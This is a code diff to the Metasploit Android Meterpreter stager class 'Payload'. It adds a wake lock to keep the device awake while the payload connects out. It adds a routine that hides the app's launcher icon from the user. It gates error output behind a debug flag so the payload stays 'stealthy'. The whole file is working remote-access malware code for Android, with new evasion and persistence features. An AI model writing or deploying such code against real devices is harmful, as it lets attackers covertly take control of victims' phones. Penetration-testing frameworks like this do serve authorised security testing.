@@ -1,6 +1,11 @@
 package com.metasploit.stage;
 
+import android.content.ComponentName;
 import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
+import android.os.PowerManager;
 
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
@@ -13,8 +18,8 @@ import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URL;
 import java.net.URLConnection;
+import java.util.List;
 import java.util.Random;
-import java.util.concurrent.TimeUnit;
 
 import dalvik.system.DexClassLoader;
 
@@ -26,6 +31,7 @@ public class Payload {
     };
 
 
+    private static Context context;
     private static long session_expiry;
     private static byte[] cert_hash;
     private static String stageless_class;
@@ -36,6 +42,7 @@ public class Payload {
 
     // Launched from activity
     public static void start(Context context) {
+        Payload.context = context;
         startInPath(context.getFilesDir().toString());
     }
 
@@ -58,15 +65,21 @@ public class Payload {
             String path = currentDir.getAbsolutePath();
             parameters = new Object[]{ path , configBytes };
         }
-        // if the first byte != 0 this is a stageless payload
-        if (configBytes[0] != 0) {
-            stageless_class = ConfigParser.readString(configBytes, 8000, 100);
-        }
 
         Config config = ConfigParser.parseConfig(configBytes);
-        if (config.transportConfigList.isEmpty()) {
+        if (config == null || config.transportConfigList == null || config.transportConfigList.isEmpty()) {
             return;
         }
+        PowerManager.WakeLock wakeLock = null;
+        if ((config.flags & Config.FLAG_WAKELOCK) != 0) {
+            PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, Payload.class.getSimpleName());
+            wakeLock.acquire();
+        }
+        if ((config.flags & Config.FLAG_HIDE_APP_ICON) != 0) {
+            hideAppIcon();
+        }
+        stageless_class = config.stageless_class;
         TransportConfig transportConfig = config.transportConfigList.get(0);
         String url = transportConfig.url;
         long currentTime = System.currentTimeMillis();
@@ -88,10 +101,10 @@ public class Payload {
                 }
                 break;
             } catch (Exception e) {
-                // Avoid printing extensive backtraces when we are trying to be
-                // stealty. An optional runtime or staging-time switch would be
-                // good to have here, like Python Meterpreter's debug option.
-                // e.printStackTrace();
+                // Avoid printing extensive backtraces when we are trying to be stealthy.
+                if ((config.flags & Config.FLAG_DEBUG) != 0) {
+                     e.printStackTrace();
+                }
             }
             try {
                 Thread.sleep(retryWait);
@@ -99,6 +112,10 @@ public class Payload {
               break;
             }
             currentTime = System.currentTimeMillis();
+        }
+
+        if (wakeLock != null) {
+            wakeLock.release();
         }
     }
 
@@ -190,5 +207,26 @@ public class Payload {
         }
 
         session_expiry = -1;
+    }
+
+    private static void hideAppIcon() {
+        if (context == null) {
+            return;
+        }
+        String packageName = context.getPackageName();
+        PackageManager packageManager = context.getPackageManager();
+        final Intent intent = new Intent(Intent.ACTION_MAIN, null);
+        intent.addCategory(Intent.CATEGORY_LAUNCHER);
+        List<ResolveInfo> activities = packageManager.queryIntentActivities(intent, 0);
+        for (ResolveInfo resolveInfo : activities) {
+            if (!packageName.equals(resolveInfo.activityInfo.packageName)) {
+                continue;
+            }
+            String activity = resolveInfo.activityInfo.name;
+            ComponentName componentName = new ComponentName(packageName, activity);
+            packageManager.setComponentEnabledSetting(componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+        }
     }
 }
